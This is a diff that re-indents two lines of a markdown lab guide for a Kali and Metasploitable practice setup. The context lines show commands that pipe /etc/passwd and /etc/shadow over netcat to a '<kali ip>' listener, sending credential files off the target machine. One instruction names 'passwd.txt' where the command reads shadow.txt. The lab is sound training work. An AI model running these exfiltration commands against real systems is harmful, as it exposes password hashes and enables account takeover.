@@ -38,7 +38,7 @@ Ensure that both the Kali and the metasploitable machines are powered on and on 
 
 	`cat /etc/passwd | nc <kali ip> 4567` (there will be no progress bar and there should be no error messages).
 
-go back to the listening netcat window and terminate it using CTRL+C. Cat the contents of the `passwd.txt` file using command below.
+	go back to the listening netcat window and terminate it using CTRL+C. Cat the contents of the `passwd.txt` file using command below.
 
 	`cat passwd.txt` 
 
@@ -48,7 +48,7 @@ go back to the listening netcat window and terminate it using CTRL+C. Cat the co
 
 	`cat /etc/shadow| nc <kali ip> 4567` (there will be no progress bar and there should be no error messages).
 
-go back to the listening netcat window and terminate it using CTRL+C. Cat the contents of the `passwd.txt` file using command below.
+	go back to the listening netcat window and terminate it using CTRL+C. Cat the contents of the `passwd.txt` file using command below.
 
 	`cat shadow.txt`
 
